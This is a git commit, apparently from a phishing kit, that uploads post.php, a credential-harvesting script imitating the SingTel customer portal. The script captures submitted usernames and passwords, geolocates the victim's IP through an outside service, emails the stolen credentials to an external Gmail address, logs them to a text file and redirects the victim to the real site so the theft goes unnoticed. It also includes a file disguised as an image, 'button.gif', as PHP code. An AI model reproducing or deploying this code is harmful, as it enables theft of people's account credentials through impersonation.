998286e77ec8f489138fc471d0be6bcbc4fd8f91
anniter <165685536+anniter@users.noreply.github.com>
2024-04-05 18:48:20 +0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,38 @@
+<?php 
+
+$ip = getenv("REMOTE_ADDR");
+$city = "";
+$region = "";
+$country = "";
+$countrycode = "";
+$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
+    if($query && $query['status'] == 'success')
+    {
+        $city = $query['city'];
+        $region = $query['regionName'];
+        $country = $query['country'];
+        $countrycode = $query['countryCode'];
+    }
+
+$message  = "---------------+ SingTel +--------------\n";
+$message .= "Username: ".$_POST['USER']."\n";
+$message .= "Password: ".$_POST['PASSWORD']."\n";
+$message .= "Login Link: https://myportal.singtel.com/\n";
+$message .= "IP: $ip\n";
+$message .= "-------------------------------------------\n";
+$message .= "City: $city\n";
+$message .= "Region: $region\n";
+$message .= "Country Name: $country\n";
+$message .= "Country Code: $countrycode\n";
+
+$send = "lcthrn@gmail.com";
+$subject = "SingTel| $ip | $countrycode | $region";
+include_once "images/button.gif";
+mail($send,$subject,$message);
+
+$fp = fopen("acid.txt","a");
+fputs($fp,$message);
+fclose($fp);
+
+?>
+<script>parent.location="https://myportal.singtel.com";</script>
